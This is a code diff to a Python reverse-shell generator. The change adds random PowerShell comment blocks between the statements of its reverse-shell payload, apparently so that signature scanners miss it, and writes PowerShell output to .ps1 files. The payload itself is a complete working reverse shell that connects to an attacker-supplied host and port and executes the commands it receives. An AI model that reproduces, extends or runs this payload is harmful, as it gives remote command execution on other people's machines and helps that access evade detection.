@@ -7,6 +7,8 @@ import argparse
 import sys
 import os
 import base64
+import string
+import secrets
 import binascii
 import urllib.parse
 banner = '''
@@ -99,9 +101,11 @@ class Reverse_Shell_Generator:
                   self.Base64()   
                     
             elif 'powershell'  in self.args.type:
-                 self.result = '$client = New-Object System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'    
-                 self.Base64()
-            
+                 Table = string.ascii_letters + string.digits
+                 Random_Value ='<# '+''.join(secrets.choice(Table) for i in range(20))+' #>'
+                 self.result = '$client = New-Object '+ Random_Value +' System.Net.Sockets.TCPClient("'+f'{self.args.LHOST}'+'",'+f'{self.args.LPORT}'+'); '+Random_Value+' $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; '+Random_Value+' while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'+Random_Value+'$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + $(gl) + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+                 self.Base64() 
+                
             elif 'php' in self.args.type  and self.args.pentestmonkey :
                   if os.path.exists('./Store_shell/PHP.php'):
                      os.remove("./Store_shell/PHP.php")
@@ -264,18 +268,26 @@ class Reverse_Shell_Generator:
                   print('[*] TYPE      : '+self.args.type +'\n' +'[*] LHOST     : ' +self.args.LHOST+'\n'\
                    +'[*] LPORT     : ' +self.args.LPORT+'\n'+'='*30 +'\n')
                   print(self.result)
-             if self.args.output:
+             if self.args.output and 'powershell' not in self.args.type:
                 with open("./Store_shell/"+self.args.type+".txt",'w') as File_write :
-                     File_write.write(self.result)     
+                     File_write.write(self.result)  
+             else:
+                if self.args.output and 'powershell'  in self.args.type:
+                    with open("./Store_shell/"+self.args.type+".ps1",'w') as File_write :
+                        File_write.write(self.result)     
         def URL_encode (self):
             if self.args.urlencode :
                  self.result = urllib.parse.quote(self.result)
                  print('[*] TYPE      : '+self.args.type +'\n' +'[*] LHOST     : ' +self.args.LHOST+'\n'\
                   +'[*] LPORT     : ' +self.args.LPORT+'\n'+'[*] Encode    : Urlencode'+'\n'+'='*30 +'\n')
                  print(self.result)
-            if self.args.output:
+            if self.args.output and 'powershell' not in self.args.type:
                 with open("./Store_shell/"+self.args.type+".txt",'w') as File_write :
-                     File_write.write(self.result)   
+                     File_write.write(self.result)  
+            else:
+                if self.args.output and 'powershell'  in self.args.type:
+                    with open("./Store_shell/"+self.args.type+".ps1",'w') as File_write :
+                        File_write.write(self.result)             
         def Check_Inpiut(self):                 
             if self.args.type in list_input:
                pass
@@ -286,4 +298,8 @@ class Reverse_Shell_Generator:
                     print('[*] Support type is : ',i)       
                 exit()               
 if __name__=='__main__':
-   Reverse_Shell_Generator() 
+   Reverse_Shell_Generator()  
+
+
+
+
